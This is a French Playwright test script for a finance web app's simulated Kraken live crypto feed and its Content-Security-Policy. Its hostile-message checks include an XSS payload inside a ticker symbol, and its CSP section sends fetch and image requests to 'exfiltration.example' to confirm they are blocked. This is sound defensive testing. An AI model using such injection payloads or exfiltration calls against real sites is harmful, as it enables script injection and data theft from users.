// Parcours v19 : cours crypto en direct (flux Kraken simulé) et politique de sécurité (CSP).
// Vérifie surtout ce qui pourrait compromettre l'appli : données envoyées, cours aberrants ou piégés,
// enregistrement, fenêtres ouvertes, arrière-plan, désactivation, destinations bloquées.
const { openApp, chromium } = require('./harness');
const out = [];
const log = (t, ok, d) => { out.push(ok); console.log((ok ? 'OK  ' : 'BUG ') + t + (d !== undefined && !ok ? '  →  ' + JSON.stringify(d) : '')); };
const N = (s) => String(s || '').replace(/[\u00a0\u202f]/g, ' ');
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

(async () => {
  const browser = await chromium.launch();
  const { page, errors } = await openApp(browser, { fixedNow: '2026-10-22T14:00:00+02:00' });
  await page.setViewportSize({ width: 390, height: 844 });
  page.on('dialog', (d) => d.accept());
  await page.evaluate(() => { document.querySelector('#splash')?.remove(); closeSheet(); DB.settings.onboarded = true; save(); nav('placements'); setPlace('bourse'); });
  const ws = (k) => page.evaluate((k) => { const w = window.__ws[k < 0 ? window.__ws.length + k : k]; return w ? { url: w.url, sent: w.sent, closed: w.closed } : null; }, k);
  const send = (o) => page.evaluate((o) => window.__ws[window.__ws.length - 1].fakeMsg(o), o);
  const btc = () => page.evaluate(() => DB.assets.find((a) => a.ticker === 'BTC-EUR').price);
  const stored = () => page.evaluate(() => { const d = Fin.deserialize(JSON.parse(localStorage.getItem('investco_v1'))); return { btc: d.assets.find((a) => a.ticker === 'BTC-EUR').price, upd: d.meta.updatedAt }; });
  const setVis = (v) => page.evaluate((v) => { Object.defineProperty(document, 'visibilityState', { configurable: true, get: () => v }); document.dispatchEvent(new Event('visibilitychange')); }, v);
  const view = () => page.evaluate(() => document.querySelector('#v-placements').textContent);

  // ===== 1. Connexion et données envoyées =====
  const n0 = await page.evaluate(() => window.__ws.length);
  const w0 = await ws(-1);
  log('Au démarrage : une seule connexion, vers wss://ws.kraken.com/v2', n0 === 1 && w0.url === 'wss://ws.kraken.com/v2', { n0, w0 });
  log('Avant ouverture : badge « connexion… »', N(await view()).includes('○ connexion…'));
  await page.evaluate(() => window.__ws[0].fakeOpen());
  const sent = (await ws(0)).sent;
  log('Message envoyé : uniquement l\'abonnement aux paires BTC/EUR et ETH/EUR, aucun montant ni donnée personnelle',
    sent.length === 1 && sent[0] === JSON.stringify({ method: 'subscribe', params: { channel: 'ticker', snapshot: true, symbol: ['BTC/EUR', 'ETH/EUR'] } }), sent);

  // ===== 2. Cours reçus =====
  const before = await stored();
  await send({ channel: 'ticker', type: 'snapshot', data: [{ symbol: 'BTC/EUR', last: 61234.5, change_pct: 1.8 }, { symbol: 'ETH/EUR', last: 2950.1, change_pct: -0.42 }] });
  await sleep(3000);
  let v = N(await view());
  log('Cours direct affiché dans Bourse (61 234,50 €), variation 24 h, badge « direct »', /61.234,50.€/.test(v) && /\+1,8.%.24.h/.test(v) && /[-−]0,42.%.24.h/.test(v) && v.includes('● direct'), v.slice(v.indexOf("Actions"), v.indexOf("Actions") + 700));
  log('Valeur de la ligne Bitcoin recalculée avec le cours direct', await page.evaluate(() => { const a = DB.assets.find((x) => x.ticker === 'BTC-EUR'); return Math.abs(assetCalc(a).value - assetCalc(a).qty * 61234.5) < 0.01; }));
  const st1 = await stored();
  log('Pas d\'écriture à chaque cours : stockage et date de mise à jour inchangés (pas de synchro Drive déclenchée)', st1.btc === before.btc && st1.upd === before.upd, { before, st1 });

  // ===== 3. Messages aberrants ou piégés =====
  const bad = [
    { channel: 'ticker', data: [{ symbol: 'BTC/EUR', last: 1e12 }] },
    { channel: 'ticker', data: [{ symbol: 'BTC/EUR', last: -1 }] },
    { channel: 'ticker', data: [{ symbol: 'BTC/EUR', last: 'abc' }] },
    { channel: 'ticker', data: [{ symbol: 'BTC/EUR', last: 'NaN' }] },
    { channel: 'ticker', data: [{ symbol: 'BTC/EUR', last: 90000 }] },
    { channel: 'ticker', data: [{ symbol: 'BTC/EUR', last: { valueOf: 1 } }] },
    { channel: 'ticker', data: [{ symbol: '<img src=x onerror="window.__pwn=1">', last: 61000 }] },
    { channel: 'ticker', data: [{ symbol: 'SOL/EUR', last: 150 }] },
    { channel: 'ticker', data: 'pas un tableau' },
    { channel: 'ticker', data: [null, 5, 'x'] },
    { channel: 'ticker', data: [{ symbol: 'BTC/EUR', last: 61300, change_pct: '<b>99</b>' }] },
  ];
  for (const m of bad) await send(m);
  await send('{"non json');
  await send('x'.repeat(200000));
  await sleep(3000);
  v = N(await view());
  log('Cours aberrants rejetés (1e12, négatif, texte, +47 %) ; seule la petite variation valide est prise (61 300)', (await btc()) === 61300, await btc());
  log('Variation 24 h non numérique ignorée (pas de « 99 » injecté)', !v.includes('99 %') && !(await page.evaluate(() => !!document.querySelector('#v-placements b')?.textContent.includes('99'))));
  log('Symbole piégé jamais inséré dans la page, aucun script exécuté', !(await page.evaluate(() => window.__pwn)) && !(await page.evaluate(() => document.querySelector('img[src="x"]'))));
  log('Paire non suivie (SOL/EUR) ignorée : aucun actif modifié', !(await page.evaluate(() => DB.assets.some((a) => a.price === 150))));

  // ===== 4. Fenêtre ouverte : rien ne bouge sous les doigts =====
  await page.evaluate(() => editAsset(0)); await page.fill('#a_name', 'Bitcoin (en cours de saisie)');
  await send({ channel: 'ticker', data: [{ symbol: 'BTC/EUR', last: 61400 }] });
  await sleep(3000);
  log('Fenêtre de saisie ouverte : pas de rafraîchissement, la saisie est conservée', await page.evaluate(() => document.querySelector('#ov').classList.contains('on') && document.querySelector('#a_name').value === 'Bitcoin (en cours de saisie)'));
  await page.evaluate(() => closeSheet());
  await send({ channel: 'ticker', data: [{ symbol: 'BTC/EUR', last: 61450 }] });
  await sleep(3000);
  log('Fenêtre fermée : le tableau se met à jour (61 450,00 €)', /61.450,00.€/.test(N(await view())), [await btc(), (N(await view()).match(/Bitcoin ›[^]{80}/)||[])[0]]);

  // ===== 5. Arrière-plan =====
  await setVis('hidden');
  await sleep(200);
  const st2 = await stored(), wHid = await ws(-1);
  log('Arrière-plan : connexion fermée', wHid.closed === true);
  log('Arrière-plan : derniers cours enregistrés (61 450 €) sans changer la date de mise à jour', st2.btc === 61450 && st2.upd === before.upd, st2);
  await setVis('visible');
  await sleep(200);
  const nVis = await page.evaluate(() => window.__ws.length);
  log('Retour au premier plan : nouvelle connexion', nVis === 2 && !(await ws(-1)).closed, nVis);
  await page.evaluate(() => window.__ws[window.__ws.length - 1].fakeOpen());

  // ===== 6. Paire inconnue de Kraken =====
  await page.evaluate(() => { DB.assets.push({ name: 'Pepe', ticker: 'PEPE-EUR', type: 'Crypto', env: 'Bitstack', price: 0.00001, sellFee: 0.01, cur: 'EUR' }); save(); renderAll(); });
  await page.evaluate(() => window.__ws[window.__ws.length - 1].fakeOpen());
  const subP = (await ws(-1)).sent[0] || '';
  log('Nouvel actif crypto : reconnexion avec la paire PEPE/EUR', subP.includes('PEPE/EUR'), subP);
  await send({ error: 'Currency pair not supported PEPE/EUR', method: 'subscribe', success: false, symbol: 'PEPE/EUR' });
  await sleep(300);
  await page.evaluate(() => window.__ws[window.__ws.length - 1].fakeOpen());
  const subQ = (await ws(-1)).sent[0] || '';
  log('Paire refusée par Kraken : retirée du direct, les autres continuent', !subQ.includes('PEPE') && subQ.includes('BTC/EUR'), subQ);
  await page.evaluate(() => priceDetail());
  const det = N(await page.textContent('#sheet'));
  log('Détail des cours : état du direct et paire « non cotée sur Kraken »', det.includes('Crypto en direct (Kraken) : connecté') && det.includes('PEPE/EUR') && det.includes('non coté sur Kraken'), det.slice(0, 400));
  await page.evaluate(() => closeSheet());

  // ===== 7. Coupure réseau : reconnexion automatique =====
  const nBefore = await page.evaluate(() => window.__ws.length);
  await page.evaluate(() => window.__ws[window.__ws.length - 1].fakeDrop());
  await sleep(2600);
  const nAfter = await page.evaluate(() => window.__ws.length);
  log('Connexion perdue : reconnexion automatique après 2 s', nAfter === nBefore + 1, { nBefore, nAfter });
  await page.evaluate(() => window.__ws[window.__ws.length - 1].fakeOpen());

  // ===== 8. ↻ Cours : le cours direct récent est utilisé =====
  await send({ channel: 'ticker', data: [{ symbol: 'BTC/EUR', last: 61500 }] });
  await page.evaluate(() => refreshPrices()); await sleep(1500);
  const rep = await page.evaluate(() => DB.settings.lastPriceReport.rep.filter((r) => r[0] === 'Bitcoin')[0]);
  log('↻ Cours : Bitcoin pris sur le direct Kraken', rep && rep[2] === 'Kraken (direct)', rep);

  // ===== 9. Désactivation dans les Réglages =====
  await page.evaluate(() => { openSettings(); document.querySelector('#sheet details').open = true; });
  await page.uncheck('#set_live'); await page.locator('#sheet button', { hasText: 'Enregistrer' }).first().click(); await sleep(400);
  const nOff = await page.evaluate(() => window.__ws.length);
  log('Direct désactivé : connexion fermée, réglage enregistré, badge retiré', (await ws(-1)).closed && (await page.evaluate(() => DB.settings.liveCrypto === false)) && !/● direct|○ connexion/.test(N(await view())), (N(await view()).match(/.{60}direct.{60}/) || [])[0]);
  await page.evaluate(() => { renderAll(); nav('dash'); renderAll(); }); await sleep(300);
  log('Direct désactivé : aucune nouvelle connexion', (await page.evaluate(() => window.__ws.length)) === nOff);
  await page.evaluate(() => { DB.settings.liveCrypto = true; DB.assets.forEach((a) => { if (a.type === 'Crypto') a.src = 'manuel'; }); save(); renderAll(); });
  await sleep(200);
  log('Cryptos en cours manuel : aucune connexion', (await page.evaluate(() => window.__ws.length)) === nOff);

  // ===== 9 bis. v19.1 : variation du jour des actions et ETF (via ↻, Yahoo simulé) =====
  let Q = { 'CW8.PA': { price: 706.12, prev: 712.94, cur: 'EUR' }, AAPL: { price: 230, prev: 228, cur: 'USD' }, 'EURUSD=X': { price: 1.08, prev: 1.08, cur: 'USD' } };
  await page.route('**/.netlify/functions/quote*', (r) => { const sy = new URL(r.request().url()).searchParams.get('s'); const q = Q[sy];
    return r.fulfill(q ? { status: 200, contentType: 'application/json', body: JSON.stringify({ ...q, sym: sy }) } : { status: 404, body: '{}' }); });
  await page.evaluate(async () => { nav('placements'); setPlace('bourse'); await refreshPrices(); });
  await sleep(300);
  v = N(await view());
  log('↻ Cours : variation du jour affichée pour l\'ETF (-0,96 % jour) et l\'action (+0,88 % jour)', /CW8 · PEA[^]{0,40}[-−]0,96 % jour/.test(v) && /AAPL · CTO[^]{0,40}\+0,88 % jour/.test(v), (v.match(/CW8 · PEA[^]{0,60}/) || [])[0]);
  log('Cours de l\'ETF mis à jour (706,12 €) et variation conservée après enregistrement', /706,12.€/.test(v) && (await page.evaluate(() => { const d = Fin.deserialize(JSON.parse(localStorage.getItem('investco_v1'))); return d.assets.find((a) => a.ticker === 'CW8').chg; })) === -0.96);
  Q = { 'CW8.PA': { price: 707, cur: 'EUR' }, AAPL: { price: 230, prev: 'n/a', cur: 'USD' }, 'EURUSD=X': { price: 1.08, cur: 'USD' } };
  await page.evaluate(async () => { await refreshPrices(); }); await sleep(300);
  v = N(await view());
  log('Clôture de la veille absente ou invalide : pas de variation affichée (jamais de valeur périmée)', !/% jour/.test(v), (v.match(/.{40}% jour/) || [])[0]);
  await page.unroute('**/.netlify/functions/quote*');

  // ===== 10. Politique de sécurité (CSP) =====
  const csp = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || '');
  const conn = (csp.match(/connect-src ([^;]+)/) || [])[1] || '';
  log('CSP présente : destinations réseau en liste fermée (pas de joker), Kraken limité au flux wss', !!csp && !/\*/.test(csp) && conn.includes('wss://ws.kraken.com') && !conn.includes('https://ws.kraken.com') && /object-src 'none'/.test(csp) && /base-uri 'self'/.test(csp), csp);
  const blocked = await page.evaluate(async () => { try { await fetch('https://exfiltration.example/collect?d=1'); return 'envoyé'; } catch (e) { return 'bloqué'; } });
  const blockedImg = await page.evaluate(() => new Promise((r) => { const i = new Image(); i.onerror = () => r('bloqué'); i.onload = () => r('envoyé'); i.src = 'https://exfiltration.example/p.gif'; }));
  const blockedWs = await page.evaluate(() => { const viol = window.__csp.length; return viol; });
  const viol = await page.evaluate(() => window.__csp.slice());
  log('Envoi vers un site non autorisé bloqué par le navigateur (requête et image)', blocked === 'bloqué' && blockedImg === 'bloqué' && viol.some((x) => x.startsWith('connect-src') && x.includes('exfiltration')) && viol.some((x) => x.startsWith('img-src')), viol);
  void blockedWs;

  // Tour complet de l'appli : aucune violation CSP en usage normal
  await page.evaluate(() => { window.__csp.length = 0; });
  for (const f of ['nav("dash")', 'nav("budget")', 'nav("revente")', 'nav("placements");setPlace("bourse")', 'setPlace("epargne")', 'setPlace("immo")', 'openSettings()', 'closeSheet();openImport()', 'closeSheet();editPea()', 'closeSheet();priceDetail()', 'closeSheet()']) {
    await page.evaluate((c) => eval(c), f); await sleep(150);
  }
  const pdf = await page.evaluate(async () => { try { if (typeof exportPdf === 'function') await exportPdf(); return 'ok'; } catch (e) { return String(e); } });
  void pdf;
  log('Usage normal (tous les écrans) : aucune violation de la politique de sécurité', (await page.evaluate(() => window.__csp.length)) === 0, await page.evaluate(() => window.__csp));
  log('Aucune erreur JavaScript', errors.length === 0, errors);
  await browser.close();
  process.exitCode = out.every(Boolean) ? 0 : 1;
})();
